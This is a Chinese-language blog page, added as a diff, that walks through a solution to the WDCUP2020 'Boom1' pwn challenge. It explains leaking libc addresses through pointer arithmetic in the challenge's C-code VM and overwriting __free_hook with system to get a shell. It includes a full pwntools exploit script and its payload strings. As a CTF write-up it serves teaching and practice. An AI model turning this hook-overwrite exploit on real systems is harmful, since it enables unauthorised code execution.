@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>WDCUP2020 Pwn Boom1 | NiceSeven&#39;s Website</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <link rel="stylesheet" href="/css/fonts.css" />
+    
+  </head>
+
+  <body>
+    <nav>
+    <ul class="menu">
+      
+      <li><a href="/">Home</a></li>
+      
+      <li><a href="/about/">About</a></li>
+      
+      <li><a href="/categories/">Categories</a></li>
+      
+      <li><a href="/tags/">Tags</a></li>
+      
+      <li><a href="/">Links</a></li>
+      
+    </ul>
+    <hr/>
+    </nav>
+
+<div class="article-meta">
+<h1><span class="title">WDCUP2020 Pwn Boom1</span></h1>
+<h2 class="author">NiceSeven</h2>
+<h2 class="date">2020/05/13</h2>
+</div>
+
+<main>
+<h1 id="2020网鼎杯-pwn-boom1">2020网鼎杯 Pwn Boom1</h1>
+<p>考点：</p>
+<p>1、VM</p>
+<p>2、C语言指针</p>
+<p>我们可以输入c语言代码，以；结束，需要有main(){}，并且主函数内只能执行一次函数</p>
+<p>思路：</p>
+<p>定义个int a，然后printf(&quot;%p&rdquo;,&amp;a)打印出a的地址，然后用gdb调试找到__free_hook和system相对&amp;a的偏移，以&amp;a为基计算__free_hook和system的地址，然后覆盖__free_hook为system地址，执行free(&quot;/bin/sh&rdquo;)来getshell</p>
+<p>为了更快的找到__free_hook和system的地址，我们需要知道libc版本</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200513231446033.png" alt="image-20200513231446033"></p>
+<p>打印出&amp;a的地址</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200513231532772.png" alt="image-20200513231532772"></p>
+<p>计算&amp;a到显示libc版本号的地址偏移，-7251476</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200513231614478.png" alt="image-20200513231614478"></p>
+<p>但是这里定义a为int类型地址8字节为单位，所以-7251476/8=-906434才是实际偏移</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200513232241308.png" alt="image-20200513232241308"></p>
+<p>因为是字符串所以偏移地址需要微调为-906435，才能puts出2.23，当然这里也可用char a来定义偏移就不需要除以8了</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200513232601953.png" alt="image-20200513232601953"></p>
+<p>我们知道libc为2.23了，然后就是计算free_hook和system相对与&amp;a的偏移了</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200513233715110.png" alt="image-20200513233715110"></p>
+<p>利用pwntools中的ELF模块，得出libc.so.6中free_hook和system的偏移，然后用实际的基地址来相加得出准确地址</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200513233825499.png" alt="image-20200513233825499"></p>
+<p>然后利用得到的&amp;a地址来distance计算偏移</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200513233902720.png" alt="image-20200513233902720"></p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200513234038038.png" alt="image-20200513234038038"></p>
+<p>&amp;a-3553328 -&gt; __free_hook</p>
+<p>&amp;a-7084680 -&gt; system</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200513234555081.png" alt="image-20200513234555081"></p>
+<p>因为我们覆盖的__free_hook有8字节，所以我们定义一个int a来传数据，同时偏移也都要除以8，当然用char也可以强制装换为int指针(int*)来覆盖hook，但是偏移还是要除以8，所以直接用int比较好</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+p <span style="color:#f92672">=</span> process([<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/tmp/ld-2.23.so</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">./pwn1</span><span style="color:#e6db74">&#34;</span>], env<span style="color:#f92672">=</span>{<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">LD_PRELOAD</span><span style="color:#e6db74">&#34;</span>:<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">libc.so.6</span><span style="color:#e6db74">&#34;</span>})
+libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./libc.so.6</span><span style="color:#e6db74">&#39;</span>)
+<span style="color:#75715e">#p=process(&#39;./pwn1&#39;)</span>
+context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">tmux</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">sp</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">-h</span><span style="color:#e6db74">&#39;</span>]
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">debug</span><span style="color:#e6db74">&#39;</span>
+
+<span style="color:#66d9ef">print</span> (<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">libc:__free_hook </span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> hex(libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">__free_hook</span><span style="color:#e6db74">&#39;</span>]))
+<span style="color:#66d9ef">print</span> (<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">libc:system </span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> hex(libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">system</span><span style="color:#e6db74">&#39;</span>]))
+
+gdb<span style="color:#f92672">.</span>attach(p)
+<span style="color:#75715e">#payload = &#39;&#39;&#39;main(){char a;puts(&amp;a-7251476);}&#39;&#39;&#39;#用来leak libc版本</span>
+<span style="color:#75715e">#payload = &#39;&#39;&#39;main(){int a;printf(&#34;%p &#34;,&amp;a);}&#39;&#39;&#39;#用来hook和system计算相对a地址的偏移</span>
+<span style="color:#75715e">#*(&amp;a-444166)-&gt;__free_hook</span>
+<span style="color:#75715e">#&amp;a-885585-&gt;system</span>
+<span style="color:#75715e">#含义就是覆盖__free_hook-&gt;system，这样在free的时候就是执行system</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#e6db74">main(){int a;*(&amp;a-444166)=&amp;a-885585;free(</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">);}</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+<span style="color:#75715e">#payload = &#39;&#39;&#39;main(){char a;*((int*)&amp;a-444166)=&amp;a-885585;free(&#34;/bin/sh&#34;);}&#39;&#39;&#39;</span>
+payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>)
+<span style="color:#75715e">#gdb.attach(p)</span>
+
+p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">I</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">m living...</span><span style="color:#e6db74">&#34;</span>,payload)
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>总结：</p>
+<p>这里因为VM程序malloc了一段很大的空间，所以申请到了mmap中，经过调试后知道__free_hook的位置在glibc的下面的mmap中</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200514000222639.png" alt="image-20200514000222639"></p>
+
+</main>
+
+  <footer>
+  
+  
+  <hr/>
+  © <a href="/">NiceSeven</a> 2017 &ndash; 2020 | <a href="https://github.com/NiceSeven">Github</a> |
+  
+  </footer>
+  </body>
+</html>
+
